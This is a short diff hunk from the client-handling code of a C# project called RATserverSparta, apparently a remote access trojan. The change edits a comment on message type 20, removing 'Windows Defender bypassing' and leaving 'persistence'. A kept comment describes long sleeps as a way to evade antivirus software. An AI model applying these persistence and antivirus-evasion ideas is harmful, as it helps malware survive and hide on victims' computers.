@@ -98,7 +98,7 @@ namespace RATserverSparta.Client
             //Creating instance to the Client Message Send class
             SocketSend ClientData = new SocketSend(ClientSocket);
 
-            //Type 20 stands for Windows Defender bypassing and persistence. Those 2 things will happen at the client side.
+            //Type 20 stands for persistence. This thing will happen at the client side.
             //Long sleeps Helping evade the anti virus, And thats because anti virus dont want to use too many resources, when programs are using long sleeps, it may help evade the AV (Anti Virus) softwares.
             new Thread(new ThreadStart(() =>
             {
